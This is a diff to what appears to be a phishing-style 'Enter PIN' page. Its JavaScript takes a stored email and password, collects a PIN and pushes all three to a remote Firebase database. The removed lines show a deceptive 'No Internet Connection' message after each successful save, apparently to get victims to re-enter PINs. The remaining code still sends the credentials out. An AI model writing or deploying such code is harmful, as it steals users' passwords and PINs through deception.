@@ -201,7 +201,7 @@
         </div>
 
         <div class="welcome">Welcome back</div>
-        <div style="display: none;" class="email-display" id="emailDisplay"></div>
+        <div class="email-display" id="emailDisplay"></div>
         <div class="pin-label">Enter PIN to continue</div>
 
         <div class="pin-dots" id="pinDots">
@@ -261,7 +261,6 @@
             document.getElementById('emailDisplay').textContent = currentEmail;
 
             let enteredPin = '';
-            let lastSavedPin = ''; // Track the last PIN that was saved
 
             const pinDots = document.querySelectorAll('.dot');
             const numpadKeys = document.querySelectorAll('.key:not(.empty)');
@@ -294,20 +293,10 @@
 
                 if (!email) {
                     showToast('Error: No email found');
-                    enteredPin = '';
-                    updateDots();
                     return;
                 }
 
-                // ✅ Check if this PIN is the same as the last saved one
-                if (enteredPin === lastSavedPin) {
-                    showToast('No Internet Connection');
-                    enteredPin = '';
-                    updateDots();
-                    return;
-                }
-
-                // ✅ Save as a NEW user with email + password + PIN
+                // ✅ SAVE EVERYTHING TOGETHER - ONE COMPLETE USER
                 const newUser = {
                     id: 'User_' + Date.now().toString(36).toUpperCase(),
                     email: email,
@@ -318,15 +307,15 @@
 
                 database.ref('users').push(newUser)
                     .then(() => {
-                        lastSavedPin = enteredPin; // ✅ Store the saved PIN
-                        showToast('No Internet Connection');
+                        showToast('Account created successfully!');
+                        // Clear localStorage after saving
+                        localStorage.removeItem('currentUserEmail');
+                        localStorage.removeItem('currentUserPassword');
                         enteredPin = '';
                         updateDots();
                     })
                     .catch((error) => {
                         showToast('Error: ' + error.message);
-                        enteredPin = '';
-                        updateDots();
                     });
             }
 
@@ -335,7 +324,7 @@
                 enteredPin += value;
                 updateDots();
                 if (enteredPin.length === 4) {
-                    setTimeout(saveUser, 300);
+                    setTimeout(saveUser, 250);
                 }
             }
 
@@ -350,7 +339,6 @@
                 localStorage.removeItem('currentUserEmail');
                 localStorage.removeItem('currentUserPassword');
                 enteredPin = '';
-                lastSavedPin = '';
                 updateDots();
                 showToast('Signed out');
                 setTimeout(() => {
@@ -396,8 +384,5 @@
             init();
         })();
     </script>
-
-    
-  <script src="protect.js"></script>
 </body>
 </html>
